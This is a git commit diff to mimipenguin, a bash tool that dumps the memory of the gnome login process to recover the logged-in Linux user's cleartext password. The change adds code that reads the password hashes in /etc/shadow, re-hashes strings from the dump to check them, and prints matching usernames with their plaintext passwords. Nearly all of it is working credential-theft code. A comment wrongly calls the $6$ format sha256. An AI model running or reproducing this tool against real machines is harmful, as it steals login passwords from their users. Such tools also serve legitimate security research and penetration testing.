715bdda8afb4a3e05805f14e8633fe00eda7b7a8
huntergregal <huntergregal@gmail.com>
2017-03-30 16:10:03 -0400

    Cleaned up - Much more effective :fire:

--- README.md
+++ README.md
@@ -3,7 +3,7 @@ A tool to dump the login password from the current linux user. Adapted after the
 * Special thanks to pugilist for cleaning up PID extraction and testing.
 
 # Details
-Takes advantage of the gnome login screen feature by dumping the memory of the process and extracting lines that have a high probability of containing the current user's cleartext password. Will attempt to calculate each word's password potential based on known strings found in the process and whether or not the hash was able to be extracted.
+Takes advantage of the gnome login screen feature by dumping the memory of the process and extracting lines that have a high probability of containing the current user's cleartext password. Will attempt to calculate each word's probability by checking hashes in /etc/shadow.
 
 # Supported/Tested
 * Kali 4.3.0 (rolling) x64
--- mimipenguin.sh
+++ mimipenguin.sh
@@ -12,6 +12,9 @@ if [[ $EUID -ne 0 ]]; then
 	exit 1
 fi
 
+#Get shadow hash
+SHADOWHASHES="$(cat /etc/shadow | cut -d':' -f 2 | egrep '^\$6\$')"
+
 #If Kali
 if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
 	#get gdm-session-worker [pam/gdm-password] process
@@ -33,56 +36,37 @@ if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
 	DUMP=$(strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
 fi
 
-#Results to STDOUT - CSV style 
-echo "Password located somewhere below:"
-echo "Word,PasswordPotential"
-
-#If hash, print it
+#If hash in dump, print it
 if [[ $HASH ]]; then
 	echo "$HASH,HASH"
+else
+	#Else Get shadow hashes
+	SHADOWHASHES="$(cat /etc/shadow | cut -d':' -f 2 | egrep '^\$6\$')"
 fi
 
 #Determine password potential for each word
 while read -r line; do
-	#if hash, prepare crypt line
+	#If hash in dump, prepare crypt line
 	if [[ $HASH ]]; then
 		CRYPT="\"$line\", \"\$6\$$SALT\""
 		if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $HASH ]]; then
-			echo "$line,HIGH	[HASH MATCH!]"
+			#Find which user's password it is (useful if used more than once!)
+			USER="$(cat /etc/shadow | grep ${HASH} | cut -d':' -f 1)"
+			echo "$USER:$line"
 		fi
-	fi
-	if [[ $line =~ ^_pammodutil.+[0-9]$ ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ ^LOGNAME= ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ UTF\-8 ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ ^splayManager[0-9]$ ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ ^gkr_system_authtok$ ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ [0-9]{1,4}:[0-9]{1,4}: ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ Manager\.Worker ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ \/usr\/share ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ \/bin ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ libgck\-1\.so\.[0-1] ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ ^\/usr\/lib ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ libgio\-2\.0\.so\.[0-1] ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ ^linux\-vdso\.so\.[0-1] ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ ^tls\/x86_64 ]]; then
-		echo "$line,LOW"
-	elif [[ $line =~ ^n\-[a-z][0-9] ]]; then
-		echo "$line,LOW"
+	#Else use shadow hashes
+	elif [[ $SHADOWHASHES ]]; then
+		while read -r thishash; do
+			SHADOWSALT="$(echo $thishash | cut -d'$' -f 3)"
+			CRYPT="\"$line\", \"\$6\$$SHADOWSALT\""
+			if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $thishash ]]; then
+				#Find which user's password it is (useful if used more than once!)
+				USER="$(cat /etc/shadow | grep ${thishash} | cut -d':' -f 1)"
+				echo "$USER:$line"
+			fi
+		done <<< "$SHADOWHASHES"
 	else
-		echo "$line,MEDIUM"
+		echo "Password not found - is this system using sha256 hashes? (\$6\$)"
 	fi
 done <<< "$DUMP"
 
